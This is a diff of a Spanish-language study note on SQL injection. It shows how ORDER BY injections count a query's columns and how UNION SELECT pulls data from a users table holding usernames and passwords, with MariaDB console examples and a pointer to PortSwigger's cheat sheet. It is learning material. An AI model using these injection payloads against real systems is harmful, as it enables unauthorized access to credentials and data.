@@ -1,3 +1,5 @@
+- Tags : #sql #sqlinjection #shep_sheet
+
 Para esto es necesario identificar las BD que estamos atacado y utilizaremos el shep sheet de burpsuit
 
 https://portswigger.net/web-security/sql-injection/cheat-sheet
@@ -6,7 +8,8 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
 Con la consulta concatenando un order by dependiendo de cual sea la BS [Oracle, MySql,Postgres] podemos determinar la cantidad de campos que devuelve una consulta 
 Ejemplo Para saber la cantidad de campos que salen, 
 Esto en la web se vera como que dará un error cuando no coincidan los campos pero al coincidir devolverá la consulta normalmente. El ejemplo es en consola en la web no se necesita ;
-```
+```sql
+
 SELECT username,password FROM users WHERE id = '1' order by 5';-- -;
 ERROR 1054 (42S22): Unknown column '5' in 'ORDER BY'
 
@@ -25,7 +28,7 @@ MariaDB [login]> SELECT username,password FROM users order by 2';-- -;;
 ```
 
 Para la extracción de datos podemos concatenar valores que coincidan con la cantidad de campos que salen en la consulta previamente determinado con el order by 
-```
+```sql
 ariaDB [login]> SELECT username,password FROM users union select 1,2 ;
 +---------------+------------------+
 | username      | password         |
